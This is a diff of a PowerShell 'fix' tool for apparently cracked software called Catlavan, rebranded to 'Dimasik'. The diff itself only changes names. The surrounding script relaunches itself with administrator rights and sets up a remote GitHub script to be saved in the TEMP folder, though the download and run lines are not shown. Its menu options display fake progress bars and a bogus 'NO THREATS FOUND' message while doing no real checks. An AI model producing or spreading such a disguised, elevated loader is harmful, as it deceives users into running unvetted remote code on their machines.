@@ -4,7 +4,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
     Exit
 }
-$Host.UI.RawUI.WindowTitle = " CONSOLE v2.0 | Cracked Catlavan"
+$Host.UI.RawUI.WindowTitle = " CONSOLE v2.0 |  Dimasik "
 $url = "https://github.com/sys1e/cmd/raw/refs/heads/main/ps1.ps1"
 $path = "$env:TEMP\ps1.ps1"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
@@ -33,7 +33,7 @@ YMMMUP^
         Write-Host $line -ForegroundColor Red
     }
     Write-Host "================================================" -ForegroundColor Magenta
-    Write-Host "    Catlavan.net v2.0 - Cracked Catlavan     " -ForegroundColor Yellow
+    Write-Host "     Dimasik  v2.0 -  Dimasik     " -ForegroundColor Yellow
     Write-Host "================================================" -ForegroundColor Magenta
     Write-Host ""
 }
@@ -54,8 +54,8 @@ do {
     Clear-Host
     Show-KRAKEH-Header
 
-    Write-Host "[1] Fix Calavan" -ForegroundColor Green
-    Write-Host "[2] Fix Cracked Catlavan" -ForegroundColor Yellow
+    Write-Host "[1] Fix  Dimasik " -ForegroundColor Green
+    Write-Host "[2] Fix Cracked  Dimasik " -ForegroundColor Yellow
     Write-Host "[3] Fix 1,2" -ForegroundColor Cyan
     Write-Host "[4] EXIT" -ForegroundColor DarkRed
     Write-Host ""
@@ -66,7 +66,7 @@ do {
             Clear-Host
             Write-Host "`n[Fix Calavan]" -ForegroundColor Green
             Show-ProgressBar -Text "CHECKING FOLDER"
-            Show-ProgressBar -Text "Fix Calavan code..."
+            Show-ProgressBar -Text "Fix  Dimasik  code..."
             Show-ProgressBar -Text "CHECKING  FILE"
             Write-Host "`n[KRA]: SCAN COMPLETE - NO THREATS FOUND" -ForegroundColor Red
             Write-Host "`nPress any key to return to menu..." -ForegroundColor Gray
@@ -116,4 +116,4 @@ Write-Host "нами" -ForegroundColor Red
 Write-Host "<3" -ForegroundColor Magenta
 
 Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause"
-Write-Host "Catlavan.net" -ForegroundColor DarkGreen
+Write-Host " Dimasik " -ForegroundColor DarkGreen
